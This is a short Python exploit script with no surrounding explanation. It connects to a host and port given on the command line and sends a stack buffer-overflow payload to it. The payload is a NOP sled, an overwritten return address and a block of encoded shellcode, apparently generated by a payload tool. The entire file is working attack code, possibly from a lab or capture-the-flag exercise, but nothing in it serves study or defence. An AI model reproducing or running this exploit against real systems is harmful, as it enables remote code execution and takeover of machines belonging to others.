import socket
import sys
rhost = sys.argv[1]
rport = int(sys.argv[2])

shellcode = (b"\xb8\x30\x29\x45\xca\xdd\xc7\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
b"\x59\x31\x42\x14\x03\x42\x14\x83\xea\xfc\xd2\xdc\xb9\x22\x9d"
b"\x1f\x42\xb3\xc1\x96\xa7\x82\xd3\xcd\xac\xb7\xe3\x86\xe1\x3b"
b"\x88\xcb\x11\x4b\x39\xa1\x3f\xd8\x37\x1e\x71\x21\x86\x9e\xdd"
b"\xe1\x89\x62\x1c\x36\x69\x5a\xef\x4b\x68\x9b\xb9\x26\x85\x71"
b"\x6d\x42\x0b\x66\x1a\x16\x97\x87\xcc\x1c\xa7\xff\x69\xe2\x53"
b"\x4c\x73\x33\x10\x04\x6b\xe3\xad\xcd\xab\x02\x62\x68\x62\x70"
b"\xb8\x3a\xfe\x4d\x4b\x8d\xff\xaf\x9d\xdf\x3f\x03\xe0\xef\xcd"
b"\x5d\x25\xd7\x2d\x28\x5d\x2b\xd3\x2b\xa6\x51\x0f\xb9\x38\xf1"
b"\xc4\x19\x9c\x03\x08\xff\x57\x0f\xe5\x8b\x3f\x0c\xf8\x58\x34"
b"\x28\x71\x5f\x9a\xb8\xc1\x44\x3e\xe0\x92\xe5\x67\x4c\x74\x19"
b"\x77\x28\x29\xbf\xfc\xdb\x3c\xbf\xfd\x23\x41\x9d\x69\xef\x8c"
b"\x1e\x69\x67\x86\x6d\x5b\x28\x3c\xfa\xd7\xa1\x9a\xfd\x6e\xa5"
b"\x1c\xd1\xc8\xa6\xe2\xd2\x28\xee\x20\x86\x78\x98\x81\xa7\x13"
b"\x58\x2d\x72\x89\x52\xb9\x77\x4b\x62\xf0\xe0\x51\x64\x10\x01"
b"\xdc\x82\x44\xb1\x8e\x1a\x25\x61\x6e\xcb\xcd\x6b\x61\x34\xed"
b"\x93\xa8\x5d\x84\x7b\x04\x35\x31\xe5\x0d\xcd\xa0\xea\x98\xab"
b"\xe3\x61\x28\x4b\xad\x81\x59\x5f\xda\xf5\xa1\x9f\x1b\x90\xa1"
b"\xf5\x1f\x32\xf6\x61\x22\x63\x30\x2e\xdd\x46\x43\x29\x21\x17"
b"\x75\x41\x14\x8d\x39\x3d\x59\x41\xb9\xbd\x0f\x0b\xb9\xd5\xf7"
b"\x6f\xea\xc0\xf7\xa5\x9f\x58\x62\x46\xc9\x0d\x25\x2e\xf7\x68"
b"\x01\xf1\x08\x5f\x11\xf6\xf6\x1d\x3e\x5f\x9e\xdd\x7e\x5f\x5e"
b"\xb4\x7e\x0f\x36\x43\x50\xa0\xf6\xac\x7b\xe9\x9e\x27\xea\x5b"
b"\x3f\x37\x27\x3d\xe1\x38\xc4\xe6\x12\x42\xa5\x19\xd3\xb3\xaf"
b"\x7d\xd4\xb3\xcf\x83\xe9\x65\xf6\xf1\x2c\xb6\x4d\x09\x1b\x9b"
b"\xe4\x80\x63\x8f\xf7\x80")

payload = b"\x90" * 146 + b"\xc3\x14\x04\x08" + b"\x90" * 5 + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c = s.connect((rhost, rport))
s.send(payload + b'\r\n')
data = s.recv(1024)
s.close()
